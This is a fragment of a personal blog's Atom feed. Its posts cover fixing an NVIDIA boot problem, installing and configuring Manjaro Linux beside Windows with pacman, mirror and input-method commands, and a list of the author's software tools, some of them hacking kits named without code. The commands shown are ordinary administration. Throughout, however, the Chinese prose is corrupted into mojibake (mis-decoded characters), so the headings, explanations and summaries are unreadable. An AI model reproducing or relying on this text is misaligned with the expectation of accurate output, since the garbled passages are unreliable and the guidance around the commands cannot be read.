/</span><br></pre></td></tr></table></figure><p>rebooté‡å¯ä¸‹å°±å¯ä»¥è¿›å…¥ç³»ç»Ÿäº†ï¼Œä¹‹åä½ å†å»æ‰¾åˆ°è¿™ä¸ªé…ç½®æ–‡ä»¶ï¼Œä¿®æ”¹<code>Rotation</code>çš„å€¼ä¸º<code>1</code>ï¼Œå†mvå›å»å°±å¥½äº†</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;å› NVIDIAæ˜¾å¡é€ æˆå¼€æœºå¯åŠ¨é—®é¢˜&quot;&gt;&lt;a href=&quot;#å› NVIDIAæ˜¾å¡é€ æˆå¼€æœºå¯åŠ¨é—®é¢˜&quot; class=&quot;headerlink&quot; title=&quot;å› NVIDIAæ˜¾å¡é€ æˆå¼€æœºå¯åŠ¨é—®é¢˜&quot;&gt;&lt;/a&gt;å› NVIDIAæ˜¾å¡é€ æˆå¼€æœºå¯åŠ¨é—®é¢˜&lt;/h2&gt;&lt;blockquote&gt;

      
    
    </summary>
    
      <category term="éšç¬”" scheme="http://qymua.com/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="linux" scheme="http://qymua.com/tags/linux/"/>
    
      <category term="deepin" scheme="http://qymua.com/tags/deepin/"/>
    
  </entry>
  
  <entry>
    <title>manjaro  linux å®‰è£…åŠä½¿ç”¨</title>
    <link href="http://qymua.com/2019/04/07/manjaro-linux-%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/"/>
    <id>http://qymua.com/2019/04/07/manjaro-linux-å®‰è£…åŠä½¿ç”¨/</id>
    <published>2019-04-07T12:18:46.000Z</published>
    <updated>2019-08-10T09:05:37.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>ä¸€ç›´æƒ³æ‰¾ä¸ªé€‚åˆå­¦ä¹ äºŒè¿›åˆ¶çš„ç¨³å®šçš„ç¬¬äºŒç³»ç»Ÿï¼Œwindowsæ˜¯ä¸å¯èƒ½ä¸è¦çš„ï¼Œé…åˆVMware+linuxå­ç³»ç»Ÿï¼Œè¿˜æ˜¯æ£’æ£’çš„ï¼å°±æ˜¯ä¸å¤ªç¨³å®šï¼Œè­¬å¦‚ä¸å°å¿ƒä¸­ç—…æ¯’ä¹‹ç±»çš„ï¼Œçˆ±æŠ˜è…¾çš„æˆ‘ï¼Œæ‰¾ä¸ªå¤‡ç”¨ç³»ç»Ÿè¿˜æ˜¯å¾ˆæœ‰å¿…è¦çš„ã€‚åªæ˜¯ä¸ºäº†æ›´ä¸“æ³¨çš„å­¦ä¹ è¿™å—å†…å®¹ï¼Œé„™äººæƒ³ç€æŠ˜è…¾ä¸€ä¸‹ã€‚ä»deepinåˆ°kubuntuï¼Œè¿˜æ˜¯æ›´é’çåŸºäºarchçš„manjaroï¼Œä»€ä¹ˆéƒ½æœ‰çš„AURï¼ŒKDEæ¡Œé¢å…¼å®¹å¾—æœ€å¥½çš„å‘è¡Œç‰ˆæœ¬ï¼Œå†…æ ¸å…±å­˜ï¼Œç‰ˆæœ¬å›é€€ï¼Œè¿˜æœ‰å„ç§ITæŠ€æœ¯å…šç®¡ç”¨çš„æ“ä½œæŠ€å·§ï¼Œå°†è¿™ä¸€åˆ‡ç»¼åˆåœ¨ä¸€èµ·ï¼Œå°±å®ƒäº†ï¼å½“ç„¶ubuntuå¤§æ³•ä¹Ÿå¾ˆä¸é”™ï¼Œwinåº•ä¸‹è¿˜æ˜¯ç»å¸¸ç”¨è™šæ‹Ÿæœºå¼€ç€çš„æ˜‚ã€‚<br><a id="more"></a></p></blockquote><h2 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h2><p>1.ä¸‹è½½é•œåƒ</p><p><a href="https://mirrors.tuna.tsinghua.edu.cn/#" target="_blank" rel="noopener">æ¸…åå¤§å­¦å¼€æºé•œåƒç«™</a></p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/006WtDzMgy1g1zxdfvin9j30c60c93yx.jpg" alt></p><p>2.å‹ç¼©ç©ºé—²åˆ†åŒºï¼ˆå»ºè®®ä½¿ç”¨å›ºæ€ï¼‰</p><p>3.åˆ¶ä½œå¯åŠ¨ç›˜</p><p>æœ‰ä¸¤ç§æ–¹å¼åˆ¶ä½œå¯åŠ¨ç›˜ï¼Œåˆ©ç”¨diskimageé€‰æ‹©iosé•œåƒï¼Œç›´æ¥åˆ¶ä½œ</p><p>ä½ ä¹Ÿå¯ä»¥é€‰æ‹©<a href="http://rufus.akeo.ie/" target="_blank" rel="noopener">rufus</a>  é€‰æ‹©<strong>DD</strong>æ¨¡å¼å†™å…¥</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/006WtDzMgy1g1zxdokq3hj30gz09oadd.jpg" alt></p><h2 id="å¼€å§‹å®‰è£…"><a href="#å¼€å§‹å®‰è£…" class="headerlink" title="å¼€å§‹å®‰è£…"></a>å¼€å§‹å®‰è£…</h2><p>æˆ‘åªç®€å•ç½—åˆ—ä¸€äº›å®‰è£…è¿‡ç¨‹ä¸­å¯èƒ½é‡åˆ°çš„é—®é¢˜ï¼š</p><p>1.manjaroå®‰è£…æ¯”è¾ƒé«˜çº§ï¼Œä»–è¿›å…¥çš„æ˜¯ä½“éªŒç‰ˆï¼Œä¹Ÿå°±æ˜¯manjaro tryå› ä¸ºæ˜¯è¯»å–å¯åŠ¨ç›˜çš„æ•°æ®ï¼Œå¯èƒ½æ¯”è¾ƒæ…¢ï¼Œæ¯•ç«ŸèŠ±é‡Œèƒ¡å“¨ ï¼Œç±»ä¼¼PEé‚£ç§å§</p><p>2.æ¸¸æˆæœ¬ï¼Œä¹Ÿå°±æ˜¯åŒæ˜¾å¡çš„ç”µè„‘ï¼Œéœ€è¦å±è”½ä¸‹ç‹¬æ˜¾æ‰èƒ½è¿›å…¥ä¸Šè¿°å›¾å½¢åŒ–å®‰è£…ç•Œé¢ï¼Œæ–¹æ³•éƒ½ä¸€æ ·ï¼Œä¿®æ”¹å¼•å¯¼é…ç½®ï¼Œdrive=åé¢çš„å€¼ä¿®æ”¹ä¸ºintel</p><p>å®‰è£…åéœ€è¦ä¿®æ”¹grub.cfgæ–‡ä»¶ï¼Œä¿®æ”¹æ¯é¡¹å¯åŠ¨å¼•å¯¼é…ç½®ï¼Œåœ¨bootå‚æ•°åæ·»åŠ <code>nouveau.modeset=0</code>å‚æ•°,è§£å†³lspciå‘½ä»¤é˜»å¡çš„é—®é¢˜,è¿™æ˜¯é€šæ³•ã€‚</p><p>3.é‡å¯åè¿›æ­¥äº†linuxï¼Œå³å¼•å¯¼é—®é¢˜ã€‚è¿›å…¥biosæŸ¥çœ‹bootå¼•å¯¼æ–¹å¼ï¼Œå¦‚æœæ˜¯legacyï¼Œå»ºè®®æ¢æˆUEFIï¼Œå¯èƒ½éœ€è¦é‡æ–°è£…æœºå“¦ï¼Œç°åœ¨çš„ç”µè„‘ä¸€èˆ¬éƒ½æ˜¯é»˜è®¤æ”¯æŒUEFIçš„ï¼Œå®ƒçš„å¼•å¯¼ç®¡ç†è¿˜æ˜¯å¾ˆèˆ’é€‚çš„ï¼Œå¯¹äºè£…å¤šç³»ç»Ÿçš„äººæ¯”è¾ƒå‹å¥½ï¼Œå¦‚æœä½ æ‰§æ„ä½¿ç”¨ä¼ ç»Ÿçš„å¼•å¯¼æ–¹å¼ï¼Œå»ºè®®é‡æ–°å®‰è£…manjaroï¼Œå¹¶åœ¨å®‰è£…é€‰é¡¹ä¸­ï¼Œæ‰¾åˆ°å¼•å¯¼å®‰è£…é€‰é¡¹ï¼Œå®‰è£…åˆ°ä¸ä½ windowsç³»ç»Ÿï¼Œå³é»˜è®¤å¼•å¯¼ç›˜ç›¸åŒçš„ç¡¬ç›˜ä¸Šï¼Œé‡å¯åä½ å°±èƒ½é¡ºåˆ©è¿›å…¥manjaroçš„grubå¼•å¯¼ç•Œé¢äº†</p><p>4.Linuxä¸WindowsåŒç³»ç»Ÿæ—¶é—´é”™ä¹±é—®é¢˜è§£å†³æ–¹æ³•</p><p>WindowsæŠŠç³»ç»Ÿç¡¬ä»¶æ—¶é—´å½“ä½œæœ¬åœ°æ—¶é—´(local time)ï¼Œå³æ“ä½œç³»ç»Ÿä¸­æ˜¾ç¤ºçš„æ—¶é—´è·ŸBIOSä¸­æ˜¾ç¤ºçš„æ—¶é—´æ˜¯ä¸€æ ·çš„ã€‚</p><p>Linux/Unix/MacæŠŠç¡¬ä»¶æ—¶é—´å½“ä½œUTCï¼Œæ“ä½œç³»ç»Ÿä¸­æ˜¾ç¤ºçš„æ—¶é—´æ˜¯ç¡¬ä»¶æ—¶é—´ç»è¿‡æ¢ç®—å¾—æ¥çš„ï¼Œæ¯”å¦‚è¯´åŒ—äº¬æ—¶é—´æ˜¯GMT+8ï¼Œåˆ™ç³»ç»Ÿä¸­æ˜¾ç¤ºæ—¶é—´æ˜¯ç¡¬ä»¶æ—¶é—´+8ã€‚è€ŒWindowsæ˜¾ç¤ºçš„æ˜¯ç¡¬ä»¶æ—¶é—´ï¼Œæ‰€ä»¥ä¸¤ä¸ªæ—¶é—´ä¼šå‘ç”Ÿé”™ä¹±ã€‚</p><p>åœ¨ Windows æŠŠç¡¬ä»¶æ—¶é—´å½“ä½œ UTC<br>å¼€ å§‹-&gt;è¿è¡Œ-&gt;CMDï¼Œæ‰“å¼€å‘½ä»¤è¡Œç¨‹åº(ä»¥ç®¡ç†å‘˜æ–¹å¼æ‰“å¼€å‘½ä»¤è¡Œç¨‹åºæ–¹å¯æœ‰æƒé™è®¿é—®æ³¨å†Œè¡¨)ï¼Œåœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥ä¸‹é¢å‘½ä»¤å¹¶å›è½¦</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Reg add HKLM<span class="symbol">\S</span>YSTEM<span class="symbol">\C</span>urrentControlSet<span class="symbol">\C</span>ontrol<span class="symbol">\T</span>imeZoneInformation /v RealTimeIsUniversal /t REG_DWORD /d 1</span><br></pre></td></tr></table></figure><h2 id="å®‰è£…åçš„é…ç½®"><a href="#å®‰è£…åçš„é…ç½®" class="headerlink" title="å®‰è£…åçš„é…ç½®"></a>å®‰è£…åçš„é…ç½®</h2><p>1.å®‰è£…åå°±å¯ä»¥å…ˆé…ç½®å›½å†…çš„è½¯ä»¶æºã€‚ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼Œç”Ÿæˆå¯ç”¨ä¸­å›½é•œåƒç«™åˆ—è¡¨ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman-mirrors -<span class="selector-tag">i</span> -c China -m rank</span><br></pre></td></tr></table></figure><p>å‹¾é€‰pingæœ€ä½çš„å°±å¥½äº†</p><p>2.åœ¨ <code>/etc/pacman.conf</code>æ–‡ä»¶æœ«å°¾æ·»åŠ ä¸€ä¸‹ä¸¤è¡Œ:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[archlinuxcn]</span></span><br><span class="line"><span class="attr">Server</span> = https://mirrors.ustc.edu.cn/archlinuxcn/<span class="variable">$arch</span></span><br></pre></td></tr></table></figure><p>3.å®‰è£…<code>archlinuxcn-keyring</code>:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo pacman -S archlinuxcn-keyring</span></span><br><span class="line"><span class="attribute">sudo pacman -Syu</span></span><br></pre></td></tr></table></figure><p>4.ä¿®æ”¹Homeä¸‹çš„ç›®å½•ä¸ºè‹±æ–‡</p><p>ä¿®æ”¹ç›®å½•æ˜ å°„æ–‡ä»¶åï¼›<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.<span class="built_in">config</span>/user-dirs.dirs</span><br></pre></td></tr></table></figure></p><p>ä¿®æ”¹ä¸ºä»¥ä¸‹å†…å®¹ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">XDG_DESKTOP_DIR</span>=<span class="string">"$HOME/Desktop"</span></span><br><span class="line"><span class="attr">XDG_DOWNLOAD_DIR</span>=<span class="string">"$HOME/Download"</span></span><br><span class="line"><span class="attr">XDG_TEMPLATES_DIR</span>=<span class="string">"$HOME/Templates"</span></span><br><span class="line"><span class="attr">XDG_PUBLICSHARE_DIR</span>=<span class="string">"$HOME/Public"</span></span><br><span class="line"><span class="attr">XDG_DOCUMENTS_DIR</span>=<span class="string">"$HOME/Documents"</span></span><br><span class="line"><span class="attr">XDG_MUSIC_DIR</span>=<span class="string">"$HOME/Music"</span></span><br><span class="line"><span class="attr">XDG_PICTURES_DIR</span>=<span class="string">"$HOME/Pictures"</span></span><br><span class="line"><span class="attr">XDG_VIDEOS_DIR</span>=<span class="string">"$HOME/Videos"</span></span><br></pre></td></tr></table></figure><p>å°†Homeç›®å½•ä¸‹çš„ä¸­æ–‡ç›®å½•åæ”¹ä¸ºå¯¹åº”çš„ä¸­æ–‡åï¼›</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line"><span class="keyword">mv</span> å…¬å…± Public</span><br><span class="line"><span class="keyword">mv</span> æ¨¡æ¿ Templates</span><br><span class="line"><span class="keyword">mv</span> è§†é¢‘ Videos</span><br><span class="line"><span class="keyword">mv</span> å›¾ç‰‡ Pictures</span><br><span class="line"><span class="keyword">mv</span> æ–‡æ¡£ Documents</span><br><span class="line"><span class="keyword">mv</span> ä¸‹è½½ Download</span><br><span class="line"><span class="keyword">mv</span> éŸ³ä¹ Music</span><br><span class="line"><span class="keyword">mv</span> æ¡Œé¢ Desktop</span><br></pre></td></tr></table></figure><p>5.å®‰è£…æœç‹—æ‹¼éŸ³</p><figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S fcitx-<span class="literal">im</span>    <span class="comment">#é»˜è®¤å…¨éƒ¨å®‰è£…</span></span><br><span class="line">sudo pacman -S fcitx-configtool</span><br><span class="line">sudo pacman -S fcitx-sogoupinyin</span><br></pre></td></tr></table></figure><p>æ–°å»º<code>~/.xprofile</code>æ–‡ä»¶ï¼ŒåŠ å…¥å¦‚ä¸‹å†…å®¹<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">export</span> <span class="attribute">GTK_IM_MODULE</span>=fcitx</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">QT_IM_MODULE</span>=fcitx</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">XMODIFIERS</span>=<span class="string">"@im=fcitx"</span></span><br></pre></td></tr></table></figure></p><p>é‡å¯åç”Ÿæ•ˆ</p><h2 id="å®‰è£…å¸¸ç”¨è½¯ä»¶"><a href="#å®‰è£…å¸¸ç”¨è½¯ä»¶" class="headerlink" title="å®‰è£…å¸¸ç”¨è½¯ä»¶"></a>å®‰è£…å¸¸ç”¨è½¯ä»¶</h2><p>å…ˆä»‹ç»å‡ æ¡pacmançš„å¸¸ç”¨å‘½ä»¤</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pacman -S  <span class="comment">#å®‰è£…</span></span><br><span class="line"></span><br><span class="line">pacman -Syu <span class="comment">#æ›´æ–°æºå¹¶å®‰è£…</span></span><br><span class="line"></span><br><span class="line">pacman -U <span class="comment">#å®‰è£…æœ¬åœ°çš„åŒ…</span></span><br><span class="line"></span><br><span class="line">pacman -<span class="keyword">Sc </span><span class="comment">#æ¸…ç†ç¼“å­˜</span></span><br><span class="line"></span><br><span class="line">pacman -R <span class="comment">#å¸è½½</span></span><br></pre></td></tr></table></figure><blockquote><p>sudo pacman -S google-chrome</p><p>sudo pacman -S firefox firefox-i18n-zh-cn</p><p>sudo pacman -S pycharm</p><p>sudo pacman -S yaourt</p><p>sudo pacman -S git</p><p>sudo pacman -S netease-cloud-music</p><p>sudo pacman -S xflux-gui-git</p><p>sudo pacman -S file-roller unrar unzip p7zip</p><p>yaourt -S wps-office</p><p>sudo pacman -S visual-studio-code-bin</p><p>sudo pacman -S flameshot</p></blockquote><p>å¦å¤–è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœä½ ä½¿ç”¨ssrï¼Œéœ€è¦åœ¨ç½‘ç»œè¿æ¥è®¾ç½®å…¨å±€ä»£ç†ï¼Œå¦åˆ™ç»ˆç«¯å’Œæµè§ˆå™¨æ— æ³•èµ°ä»£ç†ä¸Šç½‘ï¼Œåˆæˆ–è€…æ—¥å¸¸ä½¿ç”¨chromeçš„switchyOmegaæ’ä»¶æ¥å®ç°pacä»£ç†ã€‚è¿˜æœ‰ä¸€ç‚¹ï¼Œå› ä¸ºæˆ‘å•çº¯åªæ˜¯ç”¨æ¥å­¦ä¹ äºŒè¿›åˆ¶çš„ï¼Œæ‰€ä»¥æ²¡æœ‰ä¸€ç›´çº ç»“äºVMwareå·¥ä½œç«™æ— æ³•æ­£å¸¸ä½¿ç”¨çš„é—®é¢˜ï¼Œä¹Ÿå°è¯•è§£å†³è¿‡ï¼Œä½†æ˜¯ç½‘ç»œä¸Šçš„æ–¹æ³•è²Œä¼¼éƒ½è¿‡æ—¶äº†ï¼Œwikiä¹Ÿæ²¡æœ‰å†æ›´æ–°ï¼ŒVMå®˜æ–¹ä¹Ÿè¡¨ç¤ºä¸æ”¯æŒarchï¼Œso å¦‚æœä½ éœ€è¦ç”¨åˆ°è¿™ä¸ªå·¥ä½œç«™ï¼Œæœ€å¥½åˆ«å…¥å‘ğŸ˜‰</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;ä¸€ç›´æƒ³æ‰¾ä¸ªé€‚åˆå­¦ä¹ äºŒè¿›åˆ¶çš„ç¨³å®šçš„ç¬¬äºŒç³»ç»Ÿï¼Œwindowsæ˜¯ä¸å¯èƒ½ä¸è¦çš„ï¼Œé…åˆVMware+linuxå­ç³»ç»Ÿï¼Œè¿˜æ˜¯æ£’æ£’çš„ï¼å°±æ˜¯ä¸å¤ªç¨³å®šï¼Œè­¬å¦‚ä¸å°å¿ƒä¸­ç—…æ¯’ä¹‹ç±»çš„ï¼Œçˆ±æŠ˜è…¾çš„æˆ‘ï¼Œæ‰¾ä¸ªå¤‡ç”¨ç³»ç»Ÿè¿˜æ˜¯å¾ˆæœ‰å¿…è¦çš„ã€‚åªæ˜¯ä¸ºäº†æ›´ä¸“æ³¨çš„å­¦ä¹ è¿™å—å†…å®¹ï¼Œé„™äººæƒ³ç€æŠ˜è…¾ä¸€ä¸‹ã€‚ä»deepinåˆ°kubuntuï¼Œè¿˜æ˜¯æ›´é’çåŸºäºarchçš„manjaroï¼Œä»€ä¹ˆéƒ½æœ‰çš„AURï¼ŒKDEæ¡Œé¢å…¼å®¹å¾—æœ€å¥½çš„å‘è¡Œç‰ˆæœ¬ï¼Œå†…æ ¸å…±å­˜ï¼Œç‰ˆæœ¬å›é€€ï¼Œè¿˜æœ‰å„ç§ITæŠ€æœ¯å…šç®¡ç”¨çš„æ“ä½œæŠ€å·§ï¼Œå°†è¿™ä¸€åˆ‡ç»¼åˆåœ¨ä¸€èµ·ï¼Œå°±å®ƒäº†ï¼å½“ç„¶ubuntuå¤§æ³•ä¹Ÿå¾ˆä¸é”™ï¼Œwinåº•ä¸‹è¿˜æ˜¯ç»å¸¸ç”¨è™šæ‹Ÿæœºå¼€ç€çš„æ˜‚ã€‚&lt;br&gt;
    
    </summary>
    
      <category term="éšç¬”" scheme="http://qymua.com/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="linux" scheme="http://qymua.com/tags/linux/"/>
    
      <category term="manjaro" scheme="http://qymua.com/tags/manjaro/"/>
    
  </entry>
  
  <entry>
    <title>Tools recode</title>
    <link href="http://qymua.com/2019/04/07/Tools-recode/"/>
    <id>http://qymua.com/2019/04/07/Tools-recode/</id>
    <published>2019-04-07T12:10:23.000Z</published>
    <updated>2019-04-30T07:36:38.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>æœ¬å¸–æ°¸ä¹…æ›´æ–°âœ”</p></blockquote><h3 id="æµè§ˆå™¨"><a href="#æµè§ˆå™¨" class="headerlink" title="æµè§ˆå™¨"></a>æµè§ˆå™¨</h3><ul><li>chrome</li><li>Firefox</li><li>Firefoxæ¸—é€ç‰ˆ</li><li>Tor Browser</li><li>sougou Browser</li></ul><h3 id="ç³»ç»Ÿ"><a href="#ç³»ç»Ÿ" class="headerlink" title="ç³»ç»Ÿ"></a>ç³»ç»Ÿ</h3><ul><li>manjaro linux ï¼ˆç¬¬äºŒç³»ç»Ÿï¼‰</li><li>windows 10</li><li>ubuntu 18.04 (è™šæ‹Ÿæœº)</li><li>kali linux (è™šæ‹Ÿæœº)</li><li>52pojie XP (è™šæ‹Ÿæœº)</li><li>commandoVM</li></ul><a id="more"></a><h3 id="Linuxå·¥å…·"><a href="#Linuxå·¥å…·" class="headerlink" title="Linuxå·¥å…·"></a>Linuxå·¥å…·</h3><ul><li>electron-ssr</li><li>flameshot</li></ul><h3 id="å­¦ä¹ è®°å½•"><a href="#å­¦ä¹ è®°å½•" class="headerlink" title="å­¦ä¹ è®°å½•"></a>å­¦ä¹ è®°å½•</h3><ul><li>bdcam â€“å½•å±</li><li>CamtasiaStudio â€“é«˜çº§å½•å±</li><li>OneNote â€“MSè‰¯å¿ƒä¹‹ä½œ</li><li>GitNoteâ€“åŸºäºgitçš„äº‘ç¬”è®°</li><li>Typora â€“Markdownç¼–è¾‘å™¨è½»é‡çº§</li><li>Atom  â€“githubå‡ºå“Markdownç¼–è¾‘å™¨</li><li>Eagle â€“å›¾ç‰‡ç®¡ç†å·¥å…·ï¼ˆè®¾è®¡å¸ˆä¸“ç”¨ï¼‰</li><li>PicGo â€“æœ€å¥½ç”¨çš„å›¾ç‰‡ä¸Šä¼ å·¥å…·ï¼ˆæ”¯æŒå¾®åšã€githubç­‰å„å¤§ä¸»æµå›¾åºŠï¼‰</li><li>xmind â€“æ€ç»´å¯¼å›¾</li><li>ScreenToGif â€“gifå½•åˆ¶</li><li>Mweb â€“OS markdownç¼–è¾‘å™¨ï¼ˆåšå®¢ç¥å™¨ï¼‰</li><li>çŸ³å¢¨æ–‡æ¡£</li><li>å¹•å¸ƒ</li></ul><h3 id="ç¼–è¯‘å™¨"><a href="#ç¼–è¯‘å™¨" class="headerlink" title="ç¼–è¯‘å™¨"></a>ç¼–è¯‘å™¨</h3><ul><li>Visual C++ 6.0</li><li>PyCharm Community Edition</li><li>Visual Studio 2015</li><li>Visual Studio Code</li><li>IntelliJ IDEA</li></ul><h3 id="ç»ˆç«¯å·¥å…·"><a href="#ç»ˆç«¯å·¥å…·" class="headerlink" title="ç»ˆç«¯å·¥å…·"></a>ç»ˆç«¯å·¥å…·</h3><ul><li>ConEmu â€“ windows</li><li>Termux  â€“ Android</li><li>Termius â€“ ios</li><li>Termius Î±</li></ul><h3 id="æ•°æ®åº“ç®¡ç†å·¥å…·"><a href="#æ•°æ®åº“ç®¡ç†å·¥å…·" class="headerlink" title="æ•°æ®åº“ç®¡ç†å·¥å…·"></a>æ•°æ®åº“ç®¡ç†å·¥å…·</h3><ul><li>navicat</li><li>MySQL-Front</li></ul><h3 id="ç¼–è¾‘å™¨"><a href="#ç¼–è¾‘å™¨" class="headerlink" title="ç¼–è¾‘å™¨"></a>ç¼–è¾‘å™¨</h3><ul><li>Notepad++</li><li>sublime_text</li><li>010 Editor</li><li>BCompare</li></ul><h3 id="ä¸‹è½½å™¨"><a href="#ä¸‹è½½å™¨" class="headerlink" title="ä¸‹è½½å™¨"></a>ä¸‹è½½å™¨</h3><ul><li>PanDownload</li><li>SpeedPan</li><li>è¿…é›·5</li><li>è¿…é›·ç®€æ˜“ç‰ˆ</li><li>ç™¾åº¦äº‘ç›˜</li><li>æ²¹çŒ´</li></ul><h3 id="ç³»ç»Ÿå¼€æœºå¯ç”¨"><a href="#ç³»ç»Ÿå¼€æœºå¯ç”¨" class="headerlink" title="ç³»ç»Ÿå¼€æœºå¯ç”¨"></a>ç³»ç»Ÿå¼€æœºå¯ç”¨</h3><ul><li>SSR</li><li>ç«ç»’å®‰å…¨</li><li>Listary</li><li>Snipaste</li><li>Wox</li><li>Lily</li><li>Everything</li></ul><h3 id="è¿œæ§"><a href="#è¿œæ§" class="headerlink" title="è¿œæ§"></a>è¿œæ§</h3><ul><li>Teamview ä¼ä¸šç‰ˆ</li><li>TeamView å¿«é€Ÿç‰ˆ</li><li>xshell</li><li>flashFXP</li><li>putty</li></ul><h3 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h3><ul><li>phpstudy</li><li>VMware Workstation</li><li>java</li><li>python</li><li>C</li><li>node.js</li><li>git</li><li>hexo</li><li>gitbook</li></ul><h3 id="Hackerå·¥å…·"><a href="#Hackerå·¥å…·" class="headerlink" title="Hackerå·¥å…·"></a>Hackerå·¥å…·</h3><ul><li>pentestBox</li><li>å¾çˆ±ç ´è§£å·¥å…·åŒ…</li><li>å°é›·è‰</li><li>å¿ƒä¸œ</li><li>52pjé€†å‘ç³»ç»Ÿ</li><li>CTFtools</li><li>pwntools</li></ul><h3 id="åŠå…¬"><a href="#åŠå…¬" class="headerlink" title="åŠå…¬"></a>åŠå…¬</h3><p>Adobeç³»åˆ—ï¼š</p><ul><li>After Effects CC 2019</li><li>Photoshop CC 2019</li><li>Premiere Pro CC 2019</li><li>Adobe Audition CC</li><li>Adobe Fireworks CS6</li><li>Adobe Lightroom Classic CC</li></ul><p>officeç³»åˆ—ï¼š</p><ul><li>Word</li><li>PowerPoint</li><li>Excel</li><li>Visio</li><li>Project</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;æœ¬å¸–æ°¸ä¹…æ›´æ–°âœ”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;æµè§ˆå™¨&quot;&gt;&lt;a href=&quot;#æµè§ˆå™¨&quot; class=&quot;headerlink&quot; title=&quot;æµè§ˆå™¨&quot;&gt;&lt;/a&gt;æµè§ˆå™¨&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;chrome&lt;/li&gt;
&lt;li&gt;Firefox&lt;/li&gt;
&lt;li&gt;Firefoxæ¸—é€ç‰ˆ&lt;/li&gt;
&lt;li&gt;Tor Browser&lt;/li&gt;
&lt;li&gt;sougou Browser&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;ç³»ç»Ÿ&quot;&gt;&lt;a href=&quot;#ç³»ç»Ÿ&quot; class=&quot;headerlink&quot; title=&quot;ç³»ç»Ÿ&quot;&gt;&lt;/a&gt;ç³»ç»Ÿ&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;manjaro linux ï¼ˆç¬¬äºŒç³»ç»Ÿï¼‰&lt;/li&gt;
&lt;li&gt;windows 10&lt;/li&gt;
&lt;li&gt;ubuntu 18.04 (è™šæ‹Ÿæœº)&lt;/li&gt;
&lt;li&gt;kali linux (è™šæ‹Ÿæœº)&lt;/li&gt;
&lt;li&gt;52pojie XP (è™šæ‹Ÿæœº)&lt;/li&gt;
&lt;li&gt;commandoVM&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="éšç¬”" scheme="http://qymua.com/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="tools" scheme="http://qymua.com/tags/tools/"/>
    
  </entry>
  
</feed>
